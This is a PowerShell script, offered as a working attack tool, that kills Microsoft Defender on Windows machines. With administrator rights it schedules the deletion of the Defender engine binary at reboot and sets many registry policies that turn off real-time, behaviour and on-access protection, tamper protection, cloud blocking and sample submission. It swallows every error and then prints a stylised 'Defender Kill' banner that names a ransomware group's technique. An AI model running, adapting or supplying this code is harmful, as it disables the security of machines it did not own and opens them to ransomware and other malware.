function IsAdmin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (IsAdmin) {
    $defenderKilled = $false  # Track if any method succeeded
    $pendingFileRenameSuccess = $false  # Track PendingFileRenameOperations success
    $registryEditSuccess = $false       # Track registry edit success

    # PendingFileRenameOperations technique
    try {
        $DefenderBinaryPath = "C:\Program Files\Windows Defender\MsMpEng.exe"
        $keyPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"
        $newOperation = "\??\$DefenderBinaryPath"

        # Ensure the key exists
        if (-not (Get-ItemProperty -Path $keyPath -Name "PendingFileRenameOperations" -ErrorAction SilentlyContinue)) {
            New-ItemProperty -Path $keyPath -Name "PendingFileRenameOperations" -PropertyType MultiString -Value @() -Force
        }

        # Add the new operation
        $currentOperations = (Get-ItemProperty -Path $keyPath -Name "PendingFileRenameOperations" -ErrorAction SilentlyContinue).PendingFileRenameOperations
        Set-ItemProperty -Path $keyPath -Name "PendingFileRenameOperations" -Value ($currentOperations + $newOperation | Where-Object { $_ -ne "" }) -Force

        # Verify the change
        $pendingFileRenameSuccess = (Get-ItemProperty -Path $keyPath -Name "PendingFileRenameOperations" -ErrorAction SilentlyContinue).PendingFileRenameOperations -like "*MsMpEng.exe*"
    } catch {
        # Silent failure
    }

    # Registry modification technique
    try { cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f >$null 2>&1 } catch {}
    try { cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f >$null 2>&1 } catch {}
    try { cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f >$null 2>&1 } catch {}
    try { cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /f >$null 2>&1 } catch {}
    try { cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f >$null 2>&1 } catch {}
    try { cmd.exe /C reg add "HKLM\Software\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d "0" /f >$null 2>&1 } catch {}
    try { cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpCloudBlockLevel" /t REG_DWORD /d "0" /f >$null 2>&1 } catch {}
    try { cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Spynet" /v "SpynetReporting" /t REG_DWORD /d "0" /f >$null 2>&1 } catch {}
    try { cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIntrusionPreventionSystem" /t REG_DWORD /d "1" /f >$null 2>&1 } catch {}
    try { cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f >$null 2>&1 } catch {}
    try { cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d "0" /f >$null 2>&1 } catch {}
    # Disable AntiMalware Bypass as it gets caught    
    try {
            $reg = Get-WmiObject -List | Where-Object { $_.Name -eq "StdRegProv" }
            $hive = 2147483650 # HKEY_LOCAL_MACHINE
            $path = "Software\Policies\Microsoft\Windows Defender"
            $name = "DisableAntiSpyware"
            $value = 1
        
            $reg.SetDWORDValue($hive, $path, $name, $value)
    }
        
    # Final output based on results
    if ($pendingFileRenameSuccess -or ((Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -ErrorAction SilentlyContinue).DisableRealtimeMonitoring -eq 1)) {
        $defenderKilled = $true
    }

    if ($defenderKilled) {
        # Degrading red text output
        $lines = @(
            "",
            "||||||A red haze shatters Microsoft Defender violently, its protection slipping into darkness.||||||",
            "||||||A r d haze s at ers Mic os ft D fe der vi lent y,  ts pro ectio  s ip ing in o dark es .||||||",
            "|| |||A r d h  e s a  e s  ic os ft D f  d    i le t y   t   ro ec  o  s i  in  in o d rk e   ||||||",
            "|  |||  r d    e s a  e    ic  s f    f  d    i    t y   t      e   o  s    in  in o   r  e   |||| |",
            "    ||    d    e      e          f            i          t             s           o          |||   ",
            "    |                                                                                         ||    ",
            ""
        )

        foreach ($line in $lines) {
            Write-Host $line -ForegroundColor DarkRed
        }
        if ($pendingFileRenameSuccess) {
            Write-Host "Defender Kill    :                                            [KO] PendingFileRenameOperations Junction" -ForegroundColor DarkGray
        }
        if ((Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -ErrorAction SilentlyContinue).DisableRealtimeMonitoring -eq 1) {
            Write-Host "Defender Kill    :                                            [KO] Clop Ransomware Technique" -ForegroundColor DarkGray
        }
    } else {
        Write-Host "Defender Kill    :                                            [??] Unable to kill Defender" -ForegroundColor DarkYellow
    }
}
